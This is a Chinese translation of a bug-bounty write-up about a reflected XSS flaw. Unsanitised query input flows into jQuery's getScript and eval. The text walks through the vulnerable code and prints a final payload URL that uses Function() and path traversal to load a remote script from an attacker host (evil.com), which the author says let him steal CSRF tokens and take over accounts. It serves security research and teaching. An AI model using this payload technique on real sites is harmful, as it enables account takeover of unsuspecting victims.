<html>
<head>
<title>Reflected XSS Through Insecure Dynamic Loading</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">通过不安全的动态加载反映XSS</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/reflected-xss-through-insecure-dynamic-loading-dbf4d33611e0?source=collection_archive---------1-----------------------#2021-07-11">https://infosecwriteups.com/reflected-xss-through-insecure-dynamic-loading-dbf4d33611e0?source=collection_archive---------1-----------------------#2021-07-11</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="3340" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">寻找一个独特而复杂的有效负载来加载远程脚本</h2></div><p id="e4bb" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><strong class="kk iu">停止</strong>！在阅读本文之前，我鼓励你亲自尝试一下这个XSS挑战。我已经将漏洞的核心元素合并到一个简单的静态页面中:https://d11dkd80d59ds1.cloudfront.net/<a class="ae le" href="https://d11dkd80d59ds1.cloudfront.net/" rel="noopener ugc nofollow" target="_blank"/>。虽然本文将带您了解完整的利用方法，但我要警告您，这比典型的注入要复杂得多，因此，如果您花时间亲自尝试一下，这个解决方案可能更有意义。</p><figure class="lg lh li lj gt lk gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi lf"><img src="../Images/0abd5f94808915e2e13fee8956f528f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SZxEvYsp2L1OyT9yx_pJqQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">在阅读本文之前，你可以自己尝试一下这个XSS挑战。虽然本文将带您了解完整的利用方法，但我要警告您，这比典型的注入要复杂得多，因此，如果您花时间亲自尝试一下，这个解决方案可能更有意义。</figcaption></figure></div><div class="ab cl lv lw hx lx" role="separator"><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma"/></div><div class="im in io ip iq"><p id="24ff" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">最近在<a class="ae le" href="https://bugcrowd.com/gregaai" rel="noopener ugc nofollow" target="_blank"> Bugcrowd </a>上搜索一个私人程序时，我发现用户的电子邮件地址和安全问题都可以在没有密码验证或任何其他安全检查的情况下被修改。这种组合将允许攻击者成功地执行帐户接管；然而，我需要一个远程利用来证明提交。</p><p id="cc0c" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">对于那些刚接触或不熟悉Bug赏金猎人的人来说，漏洞本身并不能转化为可接受的提交。在这种情况下，我发现了一个<strong class="kk iu"> P5缺少密码确认——更改电子邮件地址</strong>。P5是最低的严重级别(P1是最高的),通常不会得到奖励。要真正展示影响，你需要一个有效的，重要的是<strong class="kk iu">远程</strong>，<strong class="kk iu"> </strong>漏洞，但就目前情况来看，攻击者需要物理访问受害者的机器，这通常会导致可怕的<em class="mc">无法修复</em>。</p><p id="2c77" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">好消息是，利用链接通常总是在范围内(至少在显示影响所需的程度上)，所以我和发薪日之间唯一的障碍是子域接管或跨站脚本(XSS)漏洞。</p></div><div class="ab cl lv lw hx lx" role="separator"><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma"/></div><div class="im in io ip iq"><h1 id="8f3a" class="md me it bd mf mg mh mi mj mk ml mm mn jz mo ka mp kc mq kd mr kf ms kg mt mu bi translated">新的希望</h1><p id="f7da" class="pw-post-body-paragraph ki kj it kk b kl mv ju kn ko mw jx kq kr mx kt ku kv my kx ky kz mz lb lc ld im bi translated">我花了几个小时浏览网站，寻找任何可能的XSS，快要放弃了。我已经用尽了通过Burp Pro的Issue活动标记的每一个项目，并手动开始检查每一页的源代码，这时我注意到一些奇怪的东西— <code class="fe na nb nc nd b"> var isDebug = getQuerystring(‘debug’, ‘false’);</code>位于靠近<code class="fe na nb nc nd b">index.html</code>顶部的脚本块中。<code class="fe na nb nc nd b">getQueryString()</code>函数非常简单——事实上，它经常在堆栈溢出中被引用(当时我完全没有意识到这一点)——并且提供了一个影响DOM的简单机会，尽管不是以一种可以立即利用的方式。</p><pre class="lg lh li lj gt ne nd nf ng aw nh bi"><span id="ec28" class="ni me it nd b gy nj nk l nl nm">var isDebug = getQuerystring(‘debug’, ‘false’);</span><span id="4516" class="ni me it nd b gy nn nk l nl nm">function getQuerystring(key, default_) {<br/>    if (default_ == null) default_ = "";<br/>    key = key.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");<br/>    var regex = new RegExp("[\\?&amp;]" + key + "=([^&amp;#]*)");<br/>    var qs = regex.exec(window.location.href);<br/>    if (qs == null)<br/>        return default_;<br/>    else<br/>        return decodeURIComponent(qs[1]);<br/>}</span></pre><p id="ff15" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">这个函数的基本要点是，它将从URL查询字符串中返回一个特定的参数(如果存在的话)(在本例中为<code class="fe na nb nc nd b">debug</code>)，否则它将返回函数调用中提供的<code class="fe na nb nc nd b">default_</code>值(在本例中为<code class="fe na nb nc nd b">false</code> )—这意味着攻击者可以通过提供查询参数来影响返回值。通过搜索我的打嗝历史，我发现这个相同的功能在几个页面上使用，但一般都是良性的结果。直到我发现一个页面以独特的方式使用了返回值。</p></div><div class="ab cl lv lw hx lx" role="separator"><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma"/></div><div class="im in io ip iq"><h1 id="6619" class="md me it bd mf mg mh mi mj mk ml mm mn jz mo ka mp kc mq kd mr kf ms kg mt mu bi translated">深入挖掘</h1><p id="87e4" class="pw-post-body-paragraph ki kj it kk b kl mv ju kn ko mw jx kq kr mx kt ku kv my kx ky kz mz lb lc ld im bi translated"><code class="fe na nb nc nd b">ViewGadgets.html</code>是唯一一个使用了<code class="fe na nb nc nd b">getQueryString()</code>函数且参数不是<code class="fe na nb nc nd b">debug</code>的页面。此外，结果值被传递给其他几个函数，这些函数似乎动态加载了几个JavaScript文件中的一个。在这一点上，我开始认为有50%的机会可以发现漏洞，并迅速将源代码的相关部分复制到本地HTML文件中，以便进行进一步的测试。从我观察到的入口点开始:</p><pre class="lg lh li lj gt ne nd nf ng aw nh bi"><span id="6630" class="ni me it nd b gy nj nk l nl nm">$(document).ready(function() {<br/>    init();<br/>});</span><span id="8042" class="ni me it nd b gy nn nk l nl nm">function init() {<br/>    ...<br/>    <!-- -->var gadgetFileName = getQuerystring(‘gadgetFileName’);<br/>    loadGadget(gadgetFileName);<br/>}</span></pre><p id="9736" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">使用源代码的本地副本，我加载了带有查询参数<code class="fe na nb nc nd b">?gadgetFileName=test</code>的页面，并开始调试脚本以理解整个流程。</p><figure class="lg lh li lj gt lk gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi no"><img src="../Images/aa8c8d33d17daa95f84fcb6c8cae055c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*krkWKSz__uJ7euY2Gvfr3g.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">使用调试器和断点来理解脚本执行。</figcaption></figure><p id="59d8" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">分解一下，<code class="fe na nb nc nd b">init()</code>函数包含一个对<code class="fe na nb nc nd b">var gadgetFileName = getQuerystring(‘gadgetFileName’);</code>的调用，它解析名为<code class="fe na nb nc nd b">gadgetFileName</code>的参数的查询字符串参数。<code class="fe na nb nc nd b">getQueryString()</code>函数最终返回由攻击者控制的原始查询字符串输入，因此应该被认为是不可信的，并随后进行清理。在这种情况下，这个未组织的输入然后被传递给<code class="fe na nb nc nd b">loadGadget()</code>,下面显示了它的整体以及我生成的一些解释代码的行内注释:</p><figure class="lg lh li lj gt lk"><div class="bz fp l di"><div class="np nq l"/></div></figure><p id="c039" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">在高层次上，查询字符串值存储在<code class="fe na nb nc nd b">_jsFileName</code>和<code class="fe na nb nc nd b">gadgetName</code>变量中。该脚本试图使用相对路径<code class="fe na nb nc nd b">./scripts/widgets/gadgets/&lt;query parameter&gt;</code>加载一个额外的本地脚本，然后通过使用<code class="fe na nb nc nd b">eval()</code>从结果导入实例化一个新对象。例如，如果查询参数是<code class="fe na nb nc nd b">?gadgetFileName=gadget.js</code>，那么这个代码块将加载<code class="fe na nb nc nd b">./scripts/widgets/gadgets/gadget.js</code>，并用<code class="fe na nb nc nd b">eval(“new gadget()”)</code>实例化一个小工具类型的新对象。不管怎么说，这就是目的——让我们看看如何滥用它。</p><p id="5dd2" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">在看到查询参数最终被传递到<code class="fe na nb nc nd b">eval()</code>语句后，我开始寻找触发警告框的方法。对于那些不是JavaScript开发人员的人来说，<code class="fe na nb nc nd b">eval()</code>是一个内置函数，它“评估表示为字符串的JavaScript代码”。例如，传递一个像<code class="fe na nb nc nd b">eval(“alert(document.domain)”)</code>这样的字符串会导致一个包含网站域名的弹出消息。它最初的目的是允许动态代码生成——在这种情况下，根据用户的动作加载特定的JavaScript文件，但通常应该非常谨慎。</p><figure class="lg lh li lj gt lk gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi nr"><img src="../Images/08a86fd8f32a0498db5e532480a9e6d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7U_To1_KkFxjustmR3ec9A.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated"><a class="ae le" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval" rel="noopener ugc nofollow" target="_blank">https://developer . Mozilla . org/en-US/docs/Web/JavaScript/Reference/Global _ Objects/eval</a></figcaption></figure><p id="ecfd" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">理解了代码之后，现在的目标是精心设计一个参数值，它可以经受住几次转换，并通过<code class="fe na nb nc nd b">eval()</code>函数执行。作为一个额外的挑战，我们必须提供一个值，以便<code class="fe na nb nc nd b">$.getScript</code>成功地加载一个合法的文件，确保代码进入<code class="fe na nb nc nd b">.done</code>块，但是我们还必须使用追加到我们注入的任何字符串的<code class="fe na nb nc nd b">new</code>操作符——这意味着我们的注入必须“创建一个用户定义的对象类型或一个具有构造函数的内置对象类型的实例”。</p></div><div class="ab cl lv lw hx lx" role="separator"><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma"/></div><div class="im in io ip iq"><h1 id="d226" class="md me it bd mf mg mh mi mj mk ml mm mn jz mo ka mp kc mq kd mr kf ms kg mt mu bi translated">最终利用</h1><p id="f227" class="pw-post-body-paragraph ki kj it kk b kl mv ju kn ko mw jx kq kr mx kt ku kv my kx ky kz mz lb lc ld im bi translated"><em class="mc">* *注意:我不建议将此有效负载添加到您的列表中——这是该网站特有的。相反，在你的狩猎中使用这些概念。** </em></p><p id="15fa" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">解释我为发现一种可能的注射所做的所有尝试需要好几篇文章。简短的版本是我使用脚本的本地副本进行测试，大量使用调试器，并根据需要修改代码，主要是删除try/catch语句，以便我可以更好地理解发生的异常。</p><p id="090c" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">最后一个有效的恶意负载是<code class="fe na nb nc nd b"><a class="ae le" href="https://www.example.com/?gadgetFileName=Function(%27%24.getScript(%22https%3a%2f%2fgregcf.s3.amazonaws.com%2ffive9_xss_exploit.js%22)%27)()%2f/../../../../../clustersSummary.js" rel="noopener ugc nofollow" target="_blank">https://www.example.com/?gadgetFileName=Function(%27%24.getScript(%22https%3a%2f%2fevil.com%2fexploit.js%22)%27)()%2f/../../../../../widgetsSummary.js</a></code>，它使我能够加载托管在<code class="fe na nb nc nd b"><a class="ae le" href="https://evil.com/exploit.js." rel="noopener ugc nofollow" target="_blank">https://evil.com/exploit.js</a></code>的外部JavaScript文件。</p><h1 id="bb4a" class="md me it bd mf mg ns mi mj mk nt mm mn jz nu ka mp kc nv kd mr kf nw kg mt mu bi translated">分解每个组件</h1><p id="e60f" class="pw-post-body-paragraph ki kj it kk b kl mv ju kn ko mw jx kq kr mx kt ku kv my kx ky kz mz lb lc ld im bi translated">为了便于解释，我将有效载荷插入到将要执行的代码中:</p><figure class="lg lh li lj gt lk"><div class="bz fp l di"><div class="np nq l"/></div></figure><ol class=""><li id="e3f7" class="nx ny it kk b kl km ko kp kr nz kv oa kz ob ld oc od oe of bi translated">和<code class="fe na nb nc nd b">eval()</code>一样，<code class="fe na nb nc nd b">new Function()</code>允许我们传递一个字符串，这个字符串将被当作代码。附加第二组括号，如<code class="fe na nb nc nd b">new Function()()</code>，使函数自调用，这意味着它在声明后立即执行。</li><li id="e3ae" class="nx ny it kk b kl og ko oh kr oi kv oj kz ok ld oc od oe of bi translated"><code class="fe na nb nc nd b">‘$.getScript(“<a class="ae le" href="https://evil.com/exploit.js" rel="noopener ugc nofollow" target="_blank">https://evil.com/exploit.js</a>")'</code>是传入<code class="fe na nb nc nd b">new Function()</code>的字符串，它使用jQuery加载远程脚本。这是恶意部分，可能就像一个警告框一样简单。</li><li id="75af" class="nx ny it kk b kl og ko oh kr oi kv oj kz ok ld oc od oe of bi translated">JavaScript注释<code class="fe na nb nc nd b">//</code>防止注入<code class="fe na nb nc nd b">../../../../../widgetsSummary.js</code>的其余部分在<code class="fe na nb nc nd b">new Function()</code>的上下文中产生语法问题。</li><li id="d832" class="nx ny it kk b kl og ko oh kr oi kv oj kz ok ld oc od oe of bi translated">最后，设置路径遍历和文件名，以确保对<code class="fe na nb nc nd b">loadGadgets()</code>中的<code class="fe na nb nc nd b">$.getScript(“./scripts/widgets/gadgets/” + _jsFileName)</code>的调用能够成功地将代码获取到success ( <code class="fe na nb nc nd b">.done</code>)代码块。为了遍历gadgets目录，找到正确的<code class="fe na nb nc nd b">../</code>号主要是一种尝试和错误，并且会根据有效负载的不同而有所不同。幸运的是，这一部分可以在开发人员控制台的网络连接选项卡中看到。页面上的独立函数引用了<code class="fe na nb nc nd b">widgetsSummary.js</code>文件，并确认该文件是合法且可访问的文件。</li></ol></div><div class="ab cl lv lw hx lx" role="separator"><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma"/></div><div class="im in io ip iq"><h1 id="d817" class="md me it bd mf mg mh mi mj mk ml mm mn jz mo ka mp kc mq kd mr kf ms kg mt mu bi translated">结果</h1><p id="5bef" class="pw-post-body-paragraph ki kj it kk b kl mv ju kn ko mw jx kq kr mx kt ku kv my kx ky kz mz lb lc ld im bi translated">将攻击者控制的远程JavaScript文件注入页面的能力带来了无限的机会。在这种情况下，我成功地展示了一个概念证明，它可以捕获CSRF令牌并更新受害者的电子邮件和安全问题。虽然它可能导致帐户被接管，但它确实需要受害者的互动——访问攻击者精心制作的链接——并被视为P2，这是P5缺乏密码确认的重大改进:更改电子邮件地址。</p></div><div class="ab cl lv lw hx lx" role="separator"><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma"/></div><div class="im in io ip iq"><p id="5ec6" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">[1]: Bugcrowd。<em class="mc"> Bugcrowd的漏洞等级分类</em>【https://bugcrowd.com/vulnerability-rating-taxonomy T2】</p><p id="49c5" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">[2]: MDN Web文档。<em class="mc">eval()</em><a class="ae le" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval" rel="noopener ugc nofollow" target="_blank">https://developer . Mozilla . org/en-US/docs/Web/JavaScript/Reference/Global _ Objects/eval</a></p><p id="5232" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">[3]: MDN Web文档。<em class="mc">新增操作符</em><a class="ae le" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/new" rel="noopener ugc nofollow" target="_blank">https://developer . Mozilla . org/en-US/docs/Web/JavaScript/Reference/Operators/new</a></p></div><div class="ab cl lv lw hx lx" role="separator"><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma mb"/><span class="ly bw bk lz ma"/></div><div class="im in io ip iq"><p id="d467" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">我在社交媒体上不太活跃，但你可以在<a class="ae le" href="https://www.linkedin.com/in/greg-gibson/" rel="noopener ugc nofollow" target="_blank"> LinkedIn </a>、<a class="ae le" href="https://bugcrowd.com/gregaai" rel="noopener ugc nofollow" target="_blank"> Bugcrowd </a>上找到我，或者在各种安全松弛或不和谐的服务器上闲逛！</p></div></div>    
</body>
</html>